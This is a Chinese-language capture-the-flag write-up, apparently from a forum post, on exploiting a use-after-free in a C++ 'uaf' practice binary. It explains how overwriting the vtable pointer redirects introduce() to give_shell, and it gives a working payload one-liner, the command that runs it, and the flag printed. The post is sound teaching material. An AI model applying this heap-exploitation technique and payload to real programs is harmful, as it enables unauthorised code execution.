
- after 分配一段地址空间，我们可以用其将已经被`free`的内存，重新`allocate`

- `free` 将指针指向的内存释放

组合起来就是`UAF`。

## 利用思路

- 调试找到虚表中`give_shell`函数地址。

- `free`后再`allocate`，得到一个可控的地址空间.

- 为了在`use`，即`m->introduce()`时，将本来执行的`introduce`函数变成执行`give_shell`函数，在`allocate`的同时，改写虚表指针。

- 劫持控制流，执行`give_shell`

## 漏洞调试和利用

### 找到`Man`的构造函数，从而找到虚函数表

![](https://bbs.kanxue.com/upload/attach/202208/721335_NNCRQVPPBQXW827.jpg)

![](https://bbs.kanxue.com/upload/attach/202208/721335_SFMVC4488RW3VZW.jpg)

![](https://bbs.kanxue.com/upload/attach/202208/721335_4J8T9DJK6QWRSYC.jpg)

### 覆盖虚表指针

![](https://bbs.kanxue.com/upload/attach/202208/721335_PFUTTKC5ARAKMJN.jpg)

- `give_shell`

![](https://bbs.kanxue.com/upload/attach/202208/721335_E2EWAQFPC24FN4T.jpg)

- `Man::introduce`

![](https://bbs.kanxue.com/upload/attach/202208/721335_2SZZFEJEVR54AR9.jpg)

- `call introduce`

![](https://bbs.kanxue.com/upload/attach/202208/721335_KBW8DFEGG9QHC55.jpg)

可以看出在执行`m->introduce()`的时候，调用`call [vptr+8]`。

为了执行`give_shell`，我们覆盖虚表指针，让它前移8个字节，这样`call [vptr+8]`的时候就调用`give_shell`了。

- `allocate`

![](https://bbs.kanxue.com/upload/attach/202208/721335_567WKD9FVHBVNPR.jpg)

从上图可以看出，原本`Man`对象分配的堆空间是0x18，即24字节，所以我们在再次分配的时候，也要分配24字节，保证自己拿到的是原先被`free`掉的地址空间。

```
Human* m = new Man("Jack", 25);

Human* w = new Woman("Jill", 21);

...

delete m;

delete w;

```

因为先`free` `m`再`free` `w`，所以为了再次拿到`m`所指向的空间，我们需要分配两次，第一次得到`w`所指向的空间，第二次才再次得到`m`所指向的空间

```
len = atoi(argv[1]);

data = new char[len];

read(open(argv[2], O_RDONLY), data, len);

```

在此题中，是通过从文件中读出内容覆盖原先的内容的，等同于之前写的`strcpy(p->name,data)`，读取的长度是命令行的`argv[1]`，打开的文件是`argv[2]`

`0x401570-0x8=0x401568->\x68\x15\x40\x00\x00\x00\x00\x00`

### getshell

![](https://bbs.kanxue.com/upload/attach/202208/721335_RMYTSGBGX7NH7JD.jpg)

```
python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" > /tmp/exp.txt

./uaf 24 /tmp/exp.txt



...



yay_f1ag_aft3r_pwning
```

## 参考链接

1. c++类实例在内存中的分配

76dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3y4F1j5X3I4G2k6%4y4Q4x3X3g2U0L8$3#2Q4x3V1k6T1K9i4A6Z5N6g2)9J5c8X3q4J5j5$3S2A6N6X3g2Q4x3V1j5J5x3o6p5J5i4K6u0r3x3o6W2Q4x3V1j5J5y4g2)9J5c8U0t1%4x3o6p5$3z5e0q4Q4x3X3g2Z5N6r3#2D9

2. ichunqiu ctf pwn

26cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8Y4q4S2k6q4)9J5c8X3y4G2N6i4u0K6k6g2)9J5c8U0f1%4y4e0l9%4

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2019-2-1 17:15

被admin编辑

，原因：
